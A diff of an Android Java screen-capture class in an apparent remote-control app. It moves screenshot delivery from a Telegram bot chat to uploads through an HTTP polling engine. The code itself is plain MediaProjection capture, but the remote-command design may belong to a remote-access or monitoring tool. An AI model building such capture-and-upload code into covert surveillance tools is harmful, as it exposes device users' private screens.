@@ -1,7 +1,6 @@
- package com.remotecontrol;
+package com.remotecontrol;
 
 import android.content.Context;
-import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.PixelFormat;
 import android.hardware.display.DisplayManager;
@@ -9,6 +8,7 @@ import android.hardware.display.VirtualDisplay;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.projection.MediaProjection;
+import android.os.Build;
 import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.WindowManager;
@@ -18,116 +18,189 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 
+/**
+ * ScreenCapture
+ *
+ * Захват экрана через MediaProjection (Android 12+).
+ * После захвата отправляет JPEG на сервер через HttpPollingEngine.uploadScreenshot().
+ * Никаких ссылок на Telegram, chatId или TelegramEngine.
+ */
 public class ScreenCapture {
 
     private static final String TAG = "ScreenCapture";
 
     private static MediaProjection activeProjection;
-    private static VirtualDisplay virtualDisplay;
-    private static ImageReader imageReader;
+    private static VirtualDisplay   virtualDisplay;
+    private static ImageReader      imageReader;
 
-    public interface ScreenshotCallback {
-        void onScreenshot(File file);
-        void onError(String message);
-    }
+    // ──────────────────────────────────────────────────
+    //  Init / Release
+    // ──────────────────────────────────────────────────
 
-    // Тот самый метод, который требовал сервис
+    /**
+     * Сохраняет MediaProjection. Вызывается из ScreenCaptureService.onStartCommand().
+     */
     public static void initProjection(MediaProjection projection, Context context) {
         activeProjection = projection;
         Log.i(TAG, "MediaProjection initialized");
+
+        if (projection != null) {
+            projection.registerCallback(new MediaProjection.Callback() {
+                @Override
+                public void onStop() {
+                    Log.w(TAG, "MediaProjection stopped externally");
+                    release();
+                }
+            }, null);
+        }
     }
 
-    // Метод очистки ресурсов для сервиса
+    /**
+     * Освобождает все ресурсы. Вызывается из ScreenCaptureService.onDestroy().
+     */
     public static void release() {
         releaseDisplayResources();
         if (activeProjection != null) {
             try { activeProjection.stop(); } catch (Exception ignored) {}
             activeProjection = null;
         }
-        Log.i(TAG, "ScreenCapture resources released");
+        Log.i(TAG, "ScreenCapture released");
     }
 
-    public static void captureWithExistingProjection(Context context, long chatId, TelegramEngine engine) {
+    // ──────────────────────────────────────────────────
+    //  Capture entry point
+    // ──────────────────────────────────────────────────
+
+    /**
+     * Делает скриншот и загружает его на сервер через HttpPollingEngine.
+     * Вызывается из ScreenCaptureService после получения MediaProjection.
+     *
+     * @param context контекст
+     * @param engine  HttpPollingEngine для загрузки файла
+     */
+    public static void captureAndUpload(Context context, HttpPollingEngine engine) {
         if (activeProjection == null) {
-            Log.e(TAG, "activeProjection is null");
-            if (engine != null) engine.sendMessage(chatId, "❌ Ошибка: проекция не активна");
+            Log.e(TAG, "captureAndUpload: projection is null");
             return;
         }
 
-        takeScreenshot(context, new ScreenshotCallback() {
-            @Override
-            public void onScreenshot(File file) {
-                if (engine != null) {
-                    // Используем 2 аргумента, как в TelegramEngine
-                    engine.sendPhoto(chatId, file);
-                }
-                context.stopService(new Intent(context, ScreenCaptureService.class));
-            }
-
-            @Override
-            public void onError(String message) {
-                Log.e(TAG, "Screenshot error: " + message);
-                if (engine != null) {
-                    engine.sendMessage(chatId, "❌ Ошибка захвата: " + message);
-                }
-            }
-        });
-    }
-
-    private static void takeScreenshot(Context context, ScreenshotCallback callback) {
+        // Получаем размеры экрана
         WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
         DisplayMetrics metrics = new DisplayMetrics();
-        wm.getDefaultDisplay().getRealMetrics(metrics);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            android.view.WindowMetrics wMetrics = wm.getCurrentWindowMetrics();
+            metrics.widthPixels  = wMetrics.getBounds().width();
+            metrics.heightPixels = wMetrics.getBounds().height();
+            metrics.densityDpi   = context.getResources().getDisplayMetrics().densityDpi;
+        } else {
+            wm.getDefaultDisplay().getRealMetrics(metrics);
+        }
 
-        int width = metrics.widthPixels;
-        int height = metrics.heightPixels;
+        int width   = metrics.widthPixels;
+        int height  = metrics.heightPixels;
         int density = metrics.densityDpi;
 
+        Log.d(TAG, "Capturing: " + width + "x" + height);
+
+        // Сбрасываем предыдущие ресурсы
+        releaseDisplayResources();
+
         imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+
         virtualDisplay = activeProjection.createVirtualDisplay(
-                "Screenshot", width, height, density,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC,
-                imageReader.getSurface(), null, null);
+                "RCCapture",
+                width, height, density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                imageReader.getSurface(),
+                null, null
+        );
 
         imageReader.setOnImageAvailableListener(reader -> {
-            imageReader.setOnImageAvailableListener(null, null);
+            // Убираем listener сразу — нам нужен один кадр
+            reader.setOnImageAvailableListener(null, null);
+
             Image image = null;
             Bitmap bitmap = null;
             try {
+                // Небольшая пауза для стабилизации кадра
+                Thread.sleep(300);
+
                 image = reader.acquireLatestImage();
-                if (image != null) {
-                    Image.Plane[] planes = image.getPlanes();
-                    ByteBuffer buffer = planes[0].getBuffer();
-                    int pixelStride = planes[0].getPixelStride();
-                    int rowStride = planes[0].getRowStride();
-                    int rowPadding = rowStride - pixelStride * width;
-
-                    bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
-                    bitmap.copyPixelsFromBuffer(buffer);
-
-                    File file = new File(context.getCacheDir(), "sc_" + System.currentTimeMillis() + ".jpg");
-                    try (FileOutputStream fos = new FileOutputStream(file)) {
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, 75, fos);
-                    }
-                    callback.onScreenshot(file);
+                if (image == null) {
+                    Log.w(TAG, "acquireLatestImage returned null");
+                    return;
                 }
+
+                bitmap = imageToBitmap(image, width, height);
+                File file = bitmapToJpeg(context, bitmap, 80);
+
+                if (file != null && engine != null) {
+                    // Загружаем в фоновом потоке (listener уже в не-UI потоке)
+                    engine.uploadScreenshot(file);
+                }
+
             } catch (Exception e) {
-                callback.onError(e.getMessage());
+                Log.e(TAG, "Capture error: " + e.getMessage());
             } finally {
-                if (image != null) image.close();
+                if (image  != null) image.close();
                 if (bitmap != null) bitmap.recycle();
                 releaseDisplayResources();
             }
         }, null);
     }
 
+    // ──────────────────────────────────────────────────
+    //  Bitmap helpers
+    // ──────────────────────────────────────────────────
+
+    private static Bitmap imageToBitmap(Image image, int width, int height) {
+        Image.Plane[] planes    = image.getPlanes();
+        ByteBuffer    buffer    = planes[0].getBuffer();
+        int pixelStride         = planes[0].getPixelStride();
+        int rowStride           = planes[0].getRowStride();
+        int rowPadding          = rowStride - pixelStride * width;
+
+        Bitmap bmp = Bitmap.createBitmap(
+                width + rowPadding / pixelStride,
+                height,
+                Bitmap.Config.ARGB_8888
+        );
+        bmp.copyPixelsFromBuffer(buffer);
+
+        // Обрезаем padding справа если есть
+        if (rowPadding != 0) {
+            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, width, height);
+            bmp.recycle();
+            return cropped;
+        }
+        return bmp;
+    }
+
+    private static File bitmapToJpeg(Context context, Bitmap bitmap, int quality) {
+        File file = new File(context.getCacheDir(),
+                "sc_" + System.currentTimeMillis() + ".jpg");
+        try (FileOutputStream fos = new FileOutputStream(file)) {
+            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, fos);
+            fos.flush();
+            Log.d(TAG, "JPEG saved: " + file.length() / 1024 + " KB → " + file.getName());
+            return file;
+        } catch (IOException e) {
+            Log.e(TAG, "bitmapToJpeg error: " + e.getMessage());
+            return null;
+        }
+    }
+
+    // ──────────────────────────────────────────────────
+    //  Cleanup
+    // ──────────────────────────────────────────────────
+
     private static void releaseDisplayResources() {
         if (virtualDisplay != null) {
-            virtualDisplay.release();
+            try { virtualDisplay.release(); } catch (Exception ignored) {}
             virtualDisplay = null;
         }
         if (imageReader != null) {
-            imageReader.close();
+            try { imageReader.close(); } catch (Exception ignored) {}
             imageReader = null;
         }
     }
